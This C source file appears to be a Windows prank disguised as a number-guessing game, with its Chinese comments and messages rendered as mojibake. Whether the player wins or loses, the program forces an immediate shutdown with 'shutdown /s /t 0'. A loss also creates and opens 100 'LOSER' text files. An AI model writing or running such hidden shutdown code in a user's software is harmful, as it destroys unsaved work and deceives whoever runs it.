#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <conio.h>
#include <time.h>
#include <ctype.h>
#include <string.h>

int main() {
    printf("\033[31m\033[1m�o�O�@�Ӳq�Ʀr�C��\033[0m\n");
    Sleep(1000); // �Ȱ� 1 ��
    printf("\033[31m\033[1m�A���T�����|�q���Ʀr\033[0m\n");
    Sleep(3000); // �Ȱ� 3 ��

    int n = 0;
    srand(time(NULL)); // ��l���H���ƺؤl
    int rand_number = rand() % 101; // ���� 0 �� 100 ���H����

    char guess[1000]; // ���a�q�����ƭ�
    int max = 100;
    int min = 0;
    int number;
    char *endptr;

    while (n < 3) {
        system("cls");
        printf("\033[33m�п�J %d �� %d �������@�Ӿ�ƼƭȡG\033[0m\n", min, max);
        fgets(guess, sizeof(guess), stdin);

        // ��������š]�Y�s�b�^
        if (guess[strlen(guess) - 1] == '\n') {
            guess[strlen(guess) - 1] = '\0';
        }

        number = strtol(guess, &endptr, 10);

        // �ˬd�O�_���\�ഫ�H�άO�_���L�Ħr��
        if (*endptr != '\0') {
            printf("�藍�_�A�п�J %d �� %d �������@�Ӿ�ƼƭȡC\n", min, max);
            continue;
        }

        if (number > max || number < min) {
            printf("�藍�_�A�Э��s��J %d �� %d �����ƭȡI\n", min, max);
            Sleep(1000);
            continue;
        }

        if (number == rand_number) {
            printf("\033[33m���߲q��I\033[0m\n");
            Sleep(1000);
            printf("\033[33m���S���y����\033[0m\n\n");
            Sleep(1000);
            printf("�C�������A�q���Y�N����...");
            Sleep(900);
            system("shutdown /s /t 0"); // Windows �������O
            break;
        }

        // �p�G�S�q��A���ܨϥΪ�
        if (number > rand_number) {
            printf("\033[31m�٬O�Ӥj�F�A�A�p�@�I�I�C\033[0m\n");
            max = number;
        } else if (number < rand_number) {
            printf("\033[31m�٬O�Ӥp�F�A�A�j�@�I�I�C\033[0m\n");
            min = number;
        }

        n++;
        if (n == 3) {
            printf("\033[31m�S���|�F�C�C\033[0m\n");
        } else {
            printf("\033[31m�A�٦� %d �����|�I\033[0m\n", 3 - n);
        }
        Sleep(1000);
    }

    if (n == 3) {
        printf("\033[33m�A��F\033[0m\n");
        Sleep(1000);
        printf("\033[33m�n�o�������\033[0m\n");
        Sleep(3000);
        system("cls");
        printf("\033[31mBIGLOSER�I�I�I\033[0m");
        Sleep(1500);

        for (int i = 1; i <= 100; i++) {
            char filename[20];
            snprintf(filename, sizeof(filename), "LOSER%d.txt", i);

            FILE *file = fopen(filename, "w");
            if (file == NULL) {
                printf("�L�k�Ы��ɮ� %s�C\n", filename);
                return 1;
            }

            for (int j = 0; j < 1500; j++) {
                fprintf(file, "LOSER!!  ");
                if ((j + 1) % 30 == 0) {
                    fprintf(file, "\n");
                }
            }

            fclose(file);

            system(filename);
            Sleep(800);
        }
    }

    printf("\033[31m�t�ΧY�N����...\033[0m\n");
    Sleep(800);
    system("shutdown /s /t 0"); // Windows �������O

    return 0;
}
